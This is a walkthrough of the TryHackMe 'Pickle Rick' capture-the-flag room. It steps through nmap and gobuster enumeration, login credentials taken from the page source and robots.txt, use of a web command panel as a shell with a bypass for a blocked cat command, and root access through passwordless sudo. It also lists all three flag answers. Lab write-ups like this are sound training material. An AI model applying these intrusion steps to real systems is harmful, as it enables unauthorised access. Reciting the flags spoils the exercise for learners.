# 🥒 TryHackMe: Pickle Rick — Walkthrough

**Difficulty:** Easy  
**Category:** CTF / Web Exploitation  
**Platform:** [TryHackMe](https://tryhackme.com)  
**Room:** Pickle Rick  

---

## 🧠 Room Overview
A fun and creative **Rick and Morty-themed CTF** where the goal is to exploit a vulnerable web server and retrieve three secret ingredients to help Rick turn himself back into a human!

---

## 🚀 Objectives
- Exploit a web application
- Gain remote command execution via a web shell
- Escalate privileges to root
- Capture 3 flags (ingredients)

---

## ⚙️ Enumeration

### 🔍 Nmap Scan
```bash
sudo nmap -A -T4 -v -oN scan_results <TARGET_IP>
```
Identified open ports:
- 80/tcp → HTTP (Apache)

🌐 Web Exploration

Visit: http://<TARGET_IP>
Check page source → Found username: R1ckRul3s

🧭 Directory Brute-Forcing
```bash
gobuster dir -u http://<TARGET_IP> -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirb/common.txt
```

Discovered:

- /login.php

- /portal.php

- /robots.txt

From robots.txt:
```nginx
Wubbalubbadubdub
```

This is the password.

🔐 Login Credentials
```makefile
Username: R1ckRul3s
Password: Wubbalubbadubdub
```
🖥️ Command Panel Access

Once logged in, you’ll find a web command panel that executes system commands — effectively a web shell.

🧩 Ingredient #1

List files:
```bash
ls -a
```

Found Sup3rPickl3Ingred.txt.

Since cat is blocked, use:
```bash
strings Sup3rPickl3Ingred.txt
```

Flag 1: mr. meeseek hair

🧩 Ingredient #2

Check for hints:
```bash
strings clue.txt
```

Hint: “Look around the file system.”

Explore users:
```bash
ls /home
ls /home/rick
```

Found second ingredients file.

Read contents:
```bash
tac /home/rick/second\ ingredients
```

Flag 2: 1 jerry tear

🧩 Ingredient #3 (Root Flag)

Check current privileges:
```bash
whoami
sudo -l
```

The www-data user can run any command as root without password.

Access /root:
```bash
sudo ls /root
sudo cat /root/3rd.txt
```

Flag 3: fleeb juice

🏁 Conclusion

We successfully exploited the web server, gained root access, and helped Rick become human again by collecting all three ingredients!

🧠 Key Learnings

- Enumeration and source code analysis

- Directory brute-forcing (GoBuster)

- Exploiting command panels

- Privilege escalation using sudo misconfigurations

🧰 Tools Used

- Nmap

- GoBuster

- Linux CLI

- Browser inspection tools

🧩 Flags Summary
Ingredient	Flag
1st	mr. meeseek hair
2nd	1 jerry tear
3rd	fleeb juice

Author: Mayank Pathak
Platform: TryHackMe
Room: Pickle Rick
